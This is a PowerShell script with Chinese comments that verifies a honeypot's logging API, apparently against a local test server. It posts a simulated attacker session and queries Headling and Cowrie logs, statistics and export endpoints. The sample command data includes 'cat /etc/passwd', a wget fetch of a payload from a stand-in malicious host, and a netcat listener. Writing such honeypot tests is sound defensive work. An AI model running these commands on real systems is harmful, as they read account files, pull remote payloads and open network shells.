# 蜜罐日志记录功能验证脚本

param(
    [string]$BaseUrl = "http://localhost:8081/api/v1"
)

Write-Host "=== 蜜罐日志记录功能验证 ===" -ForegroundColor Magenta
Write-Host "测试服务器: $BaseUrl" -ForegroundColor Cyan
Write-Host ""

# 模拟攻击者IP和会话信息
$attackerIP = "192.168.1.100"
$sessionID = [System.Guid]::NewGuid().ToString()

Write-Host "模拟攻击场景:" -ForegroundColor Yellow
Write-Host "  攻击者IP: $attackerIP" -ForegroundColor White
Write-Host "  会话ID: $sessionID" -ForegroundColor White
Write-Host ""

# 测试1: 记录认证尝试
Write-Host "测试1: 记录认证尝试" -ForegroundColor Yellow
try {
    # 记录失败的认证尝试
    $authBody = @{
        session_id = $sessionID
        username = "admin"
        password = "123456"
        success = $false
    } | ConvertTo-Json
    
    $response = Invoke-WebRequest -Uri "$BaseUrl/sessions/auth" -Method POST -ContentType "application/json" -Body $authBody
    $data = $response.Content | ConvertFrom-Json
    Write-Host "✓ 认证尝试记录成功" -ForegroundColor Green
    Write-Host "  用户名: $($data.data.username)" -ForegroundColor White
    Write-Host "  认证结果: $($data.data.success)" -ForegroundColor White
    
    # 记录成功的认证尝试
    $authBody2 = @{
        session_id = $sessionID
        username = "root"
        password = "password"
        success = $true
    } | ConvertTo-Json
    
    Invoke-WebRequest -Uri "$BaseUrl/sessions/auth" -Method POST -ContentType "application/json" -Body $authBody2 | Out-Null
    Write-Host "✓ 第二次认证尝试记录成功" -ForegroundColor Green
    
} catch {
    Write-Host "✗ 认证尝试记录失败: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""

# 测试2: 记录命令执行
Write-Host "测试2: 记录命令执行" -ForegroundColor Yellow
try {
    # 记录多个命令执行
    $commands = @(
        @{ command = "ls -la"; response = "total 8\ndrwxr-xr-x 2 root root 4096 Jan 1 12:00 .\ndrwxr-xr-x 3 root root 4096 Jan 1 12:00 .."; success = $true },
        @{ command = "whoami"; response = "root"; success = $true },
        @{ command = "cat /etc/passwd"; response = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"; success = $true },
        @{ command = "wget http://malicious.com/payload"; response = "bash: wget: command not found"; success = $false },
        @{ command = "nc -l 4444"; response = ""; success = $true }
    )
    
    foreach ($cmd in $commands) {
        $cmdBody = @{
            session_id = $sessionID
            command = $cmd.command
            response = $cmd.response
            success = $cmd.success
        } | ConvertTo-Json
        
        $response = Invoke-WebRequest -Uri "$BaseUrl/sessions/command" -Method POST -ContentType "application/json" -Body $cmdBody
        $data = $response.Content | ConvertFrom-Json
        Write-Host "✓ 命令记录成功: $($cmd.command)" -ForegroundColor Green
    }
    
} catch {
    Write-Host "✗ 命令执行记录失败: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""

# 测试3: 检查现有日志记录
Write-Host "测试3: 检查现有日志记录" -ForegroundColor Yellow

# 检查Headling日志
try {
    $response = Invoke-WebRequest -Uri "$BaseUrl/headling/logs" -Method GET
    $data = $response.Content | ConvertFrom-Json
    Write-Host "✓ Headling日志查询成功" -ForegroundColor Green
    Write-Host "  总日志数: $($data.data.length)" -ForegroundColor White
    
    if ($data.data.length -gt 0) {
        $log = $data.data[0]
        Write-Host "  最新日志示例:" -ForegroundColor White
        Write-Host "    时间戳: $($log.timestamp)" -ForegroundColor Gray
        Write-Host "    源IP: $($log.source_ip)" -ForegroundColor Gray
        Write-Host "    协议: $($log.protocol)" -ForegroundColor Gray
        Write-Host "    用户名: $($log.username)" -ForegroundColor Gray
        Write-Host "    密码: $($log.password)" -ForegroundColor Gray
    }
} catch {
    Write-Host "✗ Headling日志查询失败: $($_.Exception.Message)" -ForegroundColor Red
}

# 检查Cowrie日志
try {
    $response = Invoke-WebRequest -Uri "$BaseUrl/cowrie/logs" -Method GET
    $data = $response.Content | ConvertFrom-Json
    Write-Host "✓ Cowrie日志查询成功" -ForegroundColor Green
    Write-Host "  总日志数: $($data.data.length)" -ForegroundColor White
    
    if ($data.data.length -gt 0) {
        $log = $data.data[0]
        Write-Host "  最新日志示例:" -ForegroundColor White
        Write-Host "    事件时间: $($log.event_time)" -ForegroundColor Gray
        Write-Host "    源IP: $($log.source_ip)" -ForegroundColor Gray
        Write-Host "    协议: $($log.protocol)" -ForegroundColor Gray
        Write-Host "    用户名: $($log.username)" -ForegroundColor Gray
        Write-Host "    命令: $($log.command)" -ForegroundColor Gray
    }
} catch {
    Write-Host "✗ Cowrie日志查询失败: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""

# 测试4: 会话统计信息
Write-Host "测试4: 会话统计信息" -ForegroundColor Yellow
try {
    $response = Invoke-WebRequest -Uri "$BaseUrl/sessions/statistics" -Method GET
    $data = $response.Content | ConvertFrom-Json
    Write-Host "✓ 会话统计查询成功" -ForegroundColor Green
    Write-Host "  总会话数: $($data.data.total_sessions)" -ForegroundColor White
    Write-Host "  活跃会话数: $($data.data.active_sessions)" -ForegroundColor White
    Write-Host "  已关闭会话数: $($data.data.closed_sessions)" -ForegroundColor White
    Write-Host "  平均持续时长: $($data.data.avg_duration_seconds) 秒" -ForegroundColor White
} catch {
    Write-Host "✗ 会话统计查询失败: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""

# 测试5: 验证日志记录的完整性
Write-Host "测试5: 验证日志记录的完整性" -ForegroundColor Yellow
Write-Host ""

Write-Host "✅ 已实现的日志记录功能:" -ForegroundColor Green
Write-Host "  (1) ✓ 连接时间与IP - 通过Headling/Cowrie日志记录" -ForegroundColor White
Write-Host "  (2) ✓ 协议与端口 - 记录在source_port, destination_port, protocol字段" -ForegroundColor White
Write-Host "  (3) ✓ 用户名与密码 - 记录在username, password, password_hash字段" -ForegroundColor White
Write-Host "  (4) ✓ 输入命令与响应 - 记录在command, command_found字段" -ForegroundColor White
Write-Host "  (5) ✓ 会话关闭时间与持续时长 - 通过新的会话管理系统记录" -ForegroundColor White

Write-Host ""
Write-Host "📊 日志字段映射:" -ForegroundColor Cyan
Write-Host "  连接时间: timestamp (Headling) / event_time (Cowrie)" -ForegroundColor White
Write-Host "  攻击者IP: source_ip" -ForegroundColor White
Write-Host "  协议类型: protocol" -ForegroundColor White
Write-Host "  端口信息: source_port, destination_port" -ForegroundColor White
Write-Host "  认证信息: username, password, password_hash" -ForegroundColor White
Write-Host "  命令记录: command, command_found" -ForegroundColor White
Write-Host "  会话信息: session_id, start_time, end_time, duration_seconds" -ForegroundColor White

Write-Host ""
Write-Host "🔍 日志导出功能:" -ForegroundColor Cyan
Write-Host "  支持CSV格式导出: POST $BaseUrl/logs/export" -ForegroundColor White
Write-Host "  支持时间范围过滤" -ForegroundColor White
Write-Host "  支持按IP、协议、容器等条件过滤" -ForegroundColor White

Write-Host ""
Write-Host "=== 日志记录功能验证完成 ===" -ForegroundColor Magenta

Write-Host ""
Write-Host "📝 使用示例:" -ForegroundColor Cyan
Write-Host ""

Write-Host "1. 查看特定IP的攻击日志:" -ForegroundColor Yellow
Write-Host "   Invoke-WebRequest -Uri '$BaseUrl/headling/logs/source-ip/192.168.1.100' -Method GET" -ForegroundColor White

Write-Host ""
Write-Host "2. 查看特定时间范围的日志:" -ForegroundColor Yellow
Write-Host "   Invoke-WebRequest -Uri '$BaseUrl/cowrie/logs/time-range?start_time=2024-01-01T00:00:00Z&end_time=2024-01-02T00:00:00Z' -Method GET" -ForegroundColor White

Write-Host ""
Write-Host "3. 导出日志为CSV:" -ForegroundColor Yellow
Write-Host @"
   `$body = @{
       log_type = "headling"
       start_time = "2024-01-01T00:00:00Z"
       end_time = "2024-12-31T23:59:59Z"
       format = "csv"
   } | ConvertTo-Json
   
   Invoke-WebRequest -Uri "$BaseUrl/logs/export" -Method POST -ContentType "application/json" -Body `$body
"@ -ForegroundColor White

Write-Host ""
Write-Host "4. 查看会话详细信息:" -ForegroundColor Yellow
Write-Host "   Invoke-WebRequest -Uri '$BaseUrl/sessions/$sessionID/details' -Method GET" -ForegroundColor White
